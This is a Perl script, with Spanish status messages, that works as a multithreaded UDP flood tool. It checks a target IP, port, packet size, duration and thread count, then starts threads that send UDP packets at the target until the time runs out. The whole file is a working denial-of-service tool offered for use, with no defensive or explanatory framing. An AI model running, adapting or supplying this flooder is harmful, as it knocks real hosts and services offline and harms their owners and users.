#!/usr/bin/perl -w

 use strict;
 use Socket;
 use threads;

 my $fail = 0;
 #Usage: [IP] [port 0 for random]  [Packet size 0 for random [1-15000000]] [seconds to flood] [threads] [show each packet sent, 0 for false 1 for true]
 if($ARGV[0] =~ /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/)
 {
     print "[x]Verificación de IP válida...\n"
 }
 else
 {
     $fail = 1;
     print "[!]Comprobación de IP fallida... x.x.x.x\n";  
 }
 if($ARGV[1] =~ /^\d+$/ && $ARGV[1] > 0 && $ARGV[1] < 15000000)
 {
     print "[x]Verificación de puerto...\n";
 }
 else
 {
     $fail = 1;
     print "[!]¡Verificación de puerto fallida! 0 para aleatorio o 1-65535...\n";  
 }
 if($ARGV[2] =~ /^\d+$/ && $ARGV[2] > 0 && $ARGV[2] <= 15000000)
 {
     print "[x]Verificación del tamaño del paquete...\n";
 }
 else
 {
     $fail = 1;
     print "[!]Error al comprobar el tamaño del paquete. 0 para aleatorio - 65500...\n";  
 }
 if($ARGV[3] =~ /^\d+$/ && $ARGV[3] > 0)
 {
     print "[x]Comprobación de segundos válida...\n"
 }
 else
 {
     $fail = 1;
     print "[!]La comprobación de segundos falló ... debe ser un número entero y mayor que 0\n";  
 }
 if($ARGV[4] =~ /^\d+$/ && $ARGV[4] > 0)
 {
     print "[x]Proceso de Threads Valido...\n";
     if($ARGV[4] > 35)
     {
         print "¡Advertencia! Ha seleccionado más de 35 Threads. Esto puede causar problemas, ¡considere revisarlo!\n";
     }
 }
 else
 {
     $fail = 1;
     print "[!]La comprobación de subprocesos falló ... debe ser un número entero y mayor que 0\n";  
 }
 if($ARGV[5] =~ /(0|1)/)
 {
     print "[x]Variable \"Mostrar cada paquete\" válida\n";
 }
 else
 {
     $fail = 1;
     print "[!]Variable \"Mostrar cada paquete\" no válida 0 para no, 1 para sí ...\n";
 }


 if($fail == 0)
 {
 print "Continue?[y/n]\n";
 my $ans = <STDIN>;
 if($ans =~ /y/i)
 {
     print "[UDP Flooding] $ARGV[0] " . "| Puerto:" . ($ARGV[1] ? $ARGV[1] : "random")
     . " PacketSize:" . ($ARGV[2] ? "$ARGV[2]-byte" : "random") . " Segundos:$ARGV[3]"
     . " Threads:$ARGV[4]\n";

     use vars qw ($udp_tdn $p_s $udp_t $count $udp_td $d_c $d_cc);

     $udp_td = 0, $count = 0;

     for(; $count <= $ARGV[4]; $count += 1)
     {
         $udp_t = threads->create(\&udpflood, $ARGV[0], $ARGV[1], $ARGV[2], $ARGV[3], $ARGV[4]);
         print "Thread:$count\n";
     }

     $d_c = threads->create(\&udpdone);

     $d_cc = $d_c->join();

     for(;$d_c == 0;)
     {
         sleep(3);
     }
   
 sub udpflood
 {
     my $ip = $_[0], my $port = $_[1] ,my $size = $_[2] ,my $time = $_[3], my $threads = $_[4];
     my ($iaddr,$endtime,$psize,$pport);
     $iaddr = inet_aton("$ip");
     $endtime = time() + ($time ? $time : 1000000);
     socket("flood", PF_INET, SOCK_DGRAM, 17);
     for (;time() <= $endtime;)
     {
         $psize = $size ? $size : int(rand(1024-64)+64) ;
         $pport = $port ? $port : int(rand(65500))+1;
     send("flood", pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));
         if($ARGV[5]==1)
         {
             print "Flood Enviado: Tamaño [$psize] Puerto [$pport]\n";
         }
     }
       
     return 0;
 }
 sub udpdone
 {
     $udp_td = $udp_t->join();
     while ($udp_td == 0)
     {
     sleep(1);
     }
     print "[Flood Enviado]:Flood Terminado!\n";
     return 0;
 }
 }
 }